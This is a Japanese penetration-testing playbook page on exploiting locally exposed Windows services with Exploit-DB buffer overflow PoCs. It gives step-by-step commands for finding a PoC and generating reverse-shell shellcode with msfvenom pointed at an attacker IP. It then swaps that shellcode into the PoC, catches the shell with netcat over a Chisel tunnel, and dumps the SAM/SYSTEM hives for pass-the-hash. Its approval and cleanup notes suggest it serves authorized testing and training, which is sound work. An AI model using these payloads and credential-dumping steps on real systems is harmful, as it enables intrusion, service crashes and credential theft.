# 既知 Buffer Overflow（Exploit-DB PoC 悪用）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（対象サービスがクラッシュする場合がある）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [ ] SIEM/EDR で確実に検知される
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

> **スコープ**: `netstat` でローカルにのみ公開されているサービスを発見 → Exploit-DB の PoC を改変してシェル取得まで。ポート特定の手順は `./Enumeration_Checklist.md`（Step 1.5）を参照。

## 着火条件

- ローカルにしか公開されていないサービスが特定できた（`netstat` で `127.0.0.1:[PORT]` が LISTENING）
- そのサービスの名前・バージョンが判明した
- `searchsploit` または Exploit-DB に**そのバージョン向けの Buffer Overflow PoC** が存在する

**着火シグナル:** `searchsploit [サービス名] [バージョン]` で「Buffer Overflow」「SEH Overflow」のヒットがある。

## 環境前提

- 実行環境: テスター端末（PoC 改変・シェルコード生成・リスナー起動）+ ターゲット（PoC 実行）
- 必要なツール:
  - `searchsploit`（ペネトレ用 Linux ディストリ標準搭載）
  - `msfvenom`（Metasploit Framework 付属、ペネトレ用 Linux ディストリ標準搭載）
  - `nc`（netcat、標準搭載）
  - `chisel`（ポートフォワーディング用 → `../05_Tools_Reference/Chisel.md`）
- オフライン環境: msfvenom は Metasploit Framework がインストールされていれば動作（オフライン可）

## 先に確認すること

1. `netstat -ano | findstr ":0"` → ローカルポートと PID を確認
2. `tasklist /FI "PID eq [PID]"` → サービス名を確認
3. インストールディレクトリ・ダウンロードフォルダでバージョン番号を確認
4. `searchsploit [サービス名] [バージョン]` → PoC の有無を確認

**攻撃者の思考トレース:** Exploit-DB の PoC は「calc.exe を起動する」等のデモ用シェルコードが入っていることが多い。ここを msfvenom で生成したリバースシェルのシェルコードに差し替えるだけで動くことがほとんど。変更が必要なのは `payload` 変数の中身と `LHOST`・`LPORT` の値のみ。

---

## 1. PoC の特定とダウンロード

**コマンド:**

```bash
# [Attacker] サービス名とバージョンで検索
searchsploit [サービス名] [バージョン]
# → 「[SERVICE_NAME] [VERSION] - Buffer Overflow (PoC)」等がヒット

# 作業ディレクトリにコピー
searchsploit -m [PATH_FROM_RESULTS]
# 例: searchsploit -m windows/local/[ID].py
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| 「Buffer Overflow」「SEH Overflow」ヒット | 有望な PoC が存在する | `-m` でコピーして §2 でシェルコードを確認 |
| ヒットなし / PoC が別サービス版 | searchsploit に未掲載 | GitHub / NVD / X で「CVE-[年]-[番号] PoC」を検索（→ `../05_Tools_Reference/Searchsploit.md`） |

**注意:** PoC のファイルを確認し、`padding1`・`EIP`・`payload` 変数の構造を把握してから次のステップに進む。

---

## 2. msfvenom でシェルコードを生成

**事前準備（必須）:** ターゲットのアーキテクチャ（32/64bit）を先に確認する（`systeminfo` の `System Type` フィールド）。

**コマンド:**

```bash
# [Attacker] 32bit Windows 向けリバースシェルのシェルコード生成
msfvenom -a x86 -p windows/shell_reverse_tcp \
  LHOST=[ATTACKER_IP] LPORT=[LISTEN_PORT] \
  -b '\x00\x0A\x0D' \
  -f python -v payload
# 出力例:
# payload = b""
# payload += b"\xbd\xd9\xd7\x2b..."

# 64bit Windows 向けの場合
msfvenom -a x64 -p windows/x64/shell_reverse_tcp \
  LHOST=[ATTACKER_IP] LPORT=[LISTEN_PORT] \
  -b '\x00\x0A\x0D' \
  -f python -v payload
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `payload = b""` + 複数行 `payload += b"..."` | シェルコード生成成功 | §3 で PoC の payload 変数を丸ごと置き換える |
| `No encoders or nops found` | bad character の設定が厳しすぎる | `-b` に指定するバイトを減らして再試行 |

**注意:**

- `-b '\x00\x0A\x0D'` は Buffer Overflow で NULL バイト・改行文字が終端として扱われるため除外する
- `-f python -v payload` で Python 変数形式で出力される（PoC への貼り付けが簡単）
- LHOST はテスター側の到達可能インターフェースを確認してから指定する（`ip a`）

---

## 3. PoC のシェルコードを差し替えてリスナー起動・実行

**事前準備（必須）:** テスター端末でリスナーを起動してから PoC を実行する。

```bash
# [Attacker] リバースシェルのリスナー起動（別ターミナル）
nc -lnvp [LISTEN_PORT]
```

PoC の `payload` 変数を msfvenom の出力で丸ごと置き換える：

```python
# 元の PoC の payload 変数（デモ用）を削除して msfvenom の出力に置き換える
# 変更前（例）：
payload = b"\xba\xad\x1e\x7c..."   # ← このブロック全体を削除

# 変更後（msfvenom の出力で置き換える）：
payload  = b""
payload += b"\xbd\xd9\xd7\x2b..."
# ...（msfvenom が出力した全行）
```

接続先を PoC の `target`・ポート番号と合わせる：

```python
target = "127.0.0.1"   # Chisel でポートフォワードしている場合はこのまま
port   = [LOCAL_PORT]  # netstat で確認したポート番号
```

```bash
# [Attacker] Chisel でポートフォワーディングが確立済みであることを確認してから実行
python3 poc.py
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| nc リスナーに `connect to [[ATTACKER_IP]] from...` | シェル取得成功 | `whoami` で権限確認 → 横展開観点を確認 |
| スクリプトが接続エラーで落ちる | Chisel トンネルが切れている | テスター端末で `chisel server` が生きているか確認 |
| シェルが来ない（タイムアウト） | シェルコードのアーキテクチャ不一致 | `systeminfo` でアーキテクチャを再確認して msfvenom の `-a` を変える |

---

## 刺さらなかったとき

| 現象 | 原因の推定 | 次のアクション |
|------|----------|--------------|
| スクリプト実行してもシェルが返らない | シェルコードのアーキテクチャ（32/64bit）不一致 | `systeminfo` で OS アーキテクチャを確認して msfvenom の `-a` を変える |
| スクリプトがエラーで落ちる（接続拒否） | Chisel のトンネルが切れている / ポート番号が違う | テスター端末で `chisel server` が生きているか確認。`netstat` で再確認 |
| シェルコードに bad character が含まれている | PoC 作者と環境が異なる | PoC の冒頭コメントで bad character リストを確認して `-b` に追加 |
| サービスがクラッシュして再起動しない | サービスが自動再起動しない設定 | 一定時間待つ / Potato 系等の別手法を検討 |
| msfvenom のシェルコードが長すぎる | バッファサイズ超過 | `-e x86/shikata_ga_nai` エンコーダを外す / `overrun` バイトで調整 |

---

## 注意点・落とし穴

- **PoC を実行する前に必ず `nc -lnvp` でリスナーを起動する**: 起動なしで実行するとシェルコードが実行されてもリスナーがおらず接続が切れる
- **PoC のシェルコード差し替えは `payload` 変数の全行を置き換える**: 一部だけ残すとハイブリッドになってクラッシュする

### 昇格成功後に確認すること（横展開観点）

```powershell
# [Target] SYSTEM / Administrator 権限取得後
whoami

# SAM データベース（ローカルユーザーの NTLM ハッシュ）を取得 → 他システムへの Pass-The-Hash に使える
reg save HKLM\SAM    C:\Users\Public\sam.bak
reg save HKLM\SYSTEM C:\Users\Public\system.bak
```

```bash
# [Attacker] テスター端末で解析
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

→ SAM / SYSTEM ダンプの詳細: `./Credential_Dumping.md`

### 本番での前提

- **事前合意の要否**: ★★★（対象サービスがクラッシュするリスクがあるため書面承認必須）
- **想定されるSIEM/EDR検知**: プロセス異常終了アラート / PowerShell / msfvenom ペイロードのシグネチャ
- **業務影響リスク**: 対象サービスの一時停止・クラッシュ（自動再起動設定に依存）
- **原状回復必須項目**: ✅ 転送したバイナリ（nc.exe・chisel.exe 等）を削除
- **取得情報の取扱**: 取得したシェルのセッション・SAM ハッシュはテスト完了時破棄
- **演習環境での扱い**: 制約なし

### 関連技術

- 前：ローカルポートの発見（netstat）→ `./Enumeration_Checklist.md`（Step 1.5）
- 前：Chisel でポートフォワーディング → `../05_Tools_Reference/Chisel.md`
- 前：searchsploit で PoC を特定 → `../05_Tools_Reference/Searchsploit.md`
- 後：SAM ダンプで認証情報取得 → `./Credential_Dumping.md`
